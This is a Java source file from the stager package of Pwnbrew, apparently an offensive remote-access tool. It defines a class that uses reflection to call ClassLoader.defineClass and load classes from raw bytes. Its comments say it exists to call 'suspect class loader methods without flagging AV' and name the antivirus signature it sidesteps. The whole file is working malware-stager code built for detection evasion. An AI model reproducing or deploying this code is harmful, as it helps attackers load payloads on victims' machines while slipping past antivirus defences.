/*

Copyright (C) 2013-2014, Securifera, Inc 

All rights reserved. 

Redistribution and use in source and binary forms, with or without modification, 
are permitted provided that the following conditions are met:

    * Redistributions of source code must retain the above copyright notice,
	this list of conditions and the following disclaimer.

    * Redistributions in binary form must reproduce the above copyright notice,
	this list of conditions and the following disclaimer in the documentation 
	and/or other materials provided with the distribution.

    * Neither the name of Securifera, Inc nor the names of its contributors may be 
	used to endorse or promote products derived from this software without specific
	prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS 
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY 
AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER 
OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON 
ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT 
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, 
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

================================================================================

Pwnbrew is provided under the 3-clause BSD license above.

The copyright on this package is held by Securifera, Inc

*/


package stager;

/*
* DefineClassMethod.java
*
*/


import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.security.ProtectionDomain;

/**
 *
 *
 */
public class DefineClassMethod extends Object {
    
    private Method aMethod = null;
    
    // This class was created to call suspect class loader methods without flagging AV
    public DefineClassMethod() {    
        try {
            aMethod = ClassLoader.class.getDeclaredMethod("defineClass",
                    new Class[] { String.class, byte[].class, int.class, int.class, ProtectionDomain.class }); //Exploit.Zip.Heuristic-java.csrvpr signature
            aMethod.setAccessible(true);
        } catch (NoSuchMethodException | SecurityException ex) {
        }      
    }
    
    public Class runMethod(Object passedObj, byte[] arrayOfBytes, int classLength, ProtectionDomain localProtectionDomain ) {
        Class localClass = null;                   
        try {
            localClass = (Class) aMethod.invoke( passedObj, new Object[] { null, arrayOfBytes, 0, classLength, localProtectionDomain });
        } catch (IllegalAccessException | IllegalArgumentException | InvocationTargetException ex) {
            System.out.println(ex.getMessage());
        }       
        return localClass;
    }

}/* END CLASS DefineClassMethod */
